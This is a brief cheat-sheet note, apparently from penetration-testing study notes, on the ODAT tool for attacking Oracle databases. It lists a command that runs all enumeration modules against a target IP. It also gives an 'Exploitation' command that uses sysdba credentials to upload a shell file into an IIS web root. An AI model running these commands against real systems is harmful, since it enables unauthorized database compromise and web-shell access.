---
type: tool
category: tns
tags:
  - tool
---
# Overview

## Quick Commands
Scan the target with the ODAT-tool and paramater all (-a), in order to run all modules and gather information:
```bash
sudo odat all -s 10.129.205.19
```

^712863

## Important Parameter

## Exploitation
If there is a webserver running on the DB-server, it is possible to upload a shell to it (The Path varies, depending on the OS and webserver in use, here it ist the defaultpath of MS-IIS): ^16e34e
```bash
odat utlfile -s 10.129.204.235 -d XE -U username -P password --sysdba --putFile C:\\inetpub\\wwwroot shell-file.txt ./shell-file-name-on-target-server.txt
```

^b32330